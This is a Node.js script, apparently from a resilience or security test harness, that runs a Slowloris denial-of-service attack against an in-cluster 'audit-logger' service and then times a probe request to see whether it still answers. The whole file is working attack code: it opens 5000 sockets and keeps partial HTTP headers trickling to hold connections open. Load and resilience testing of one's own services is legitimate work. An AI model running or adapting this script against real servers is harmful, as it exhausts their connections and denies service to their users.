const net = require('net');
const http = require('http');
const start = Date.now();
const scenario = process.argv[2] || 'EX-3';
const namespace = process.argv[3] || 'ns-baseline';

const host = `audit-logger.${namespace}.svc.cluster.local`;
const port = 80;
const numConnections = 5000; // Massively increased to find Go app limits
const connections = [];

console.log(`[Slowloris] Starting massive attack with ${numConnections} connections...`);

for (let i = 0; i < numConnections; i++) {
    const client = new net.Socket();
    client.connect(port, host, () => {
        client.write(`GET /log HTTP/1.1\r\nHost: ${host}\r\n`);
        const interval = setInterval(() => {
            if (client.writable) {
                client.write(`X-a: ${Math.random()}\r\n`);
            } else {
                clearInterval(interval);
            }
        }, 2000); 
        connections.push({ client, interval });
    });
    client.on('error', () => {});
}

setTimeout(() => {
    const options = {
        hostname: host,
        port: 80,
        path: '/log',
        method: 'POST',
        timeout: 2000 
    };

    const req = http.request(options, (res) => {
        const duration = Date.now() - start;
        process.stdout.write(`${res.statusCode} ${duration.toFixed(2)}\n`);
        cleanup();
    });

    req.on('error', (e) => {
        const duration = Date.now() - start;
        process.stdout.write(`000 ${duration.toFixed(2)}\n`);
        cleanup();
    });

    req.end();
}, 12000);

function cleanup() {
    connections.forEach(conn => {
        clearInterval(conn.interval);
        conn.client.destroy();
    });
    process.exit(0);
}

setTimeout(() => { cleanup(); }, 45000);
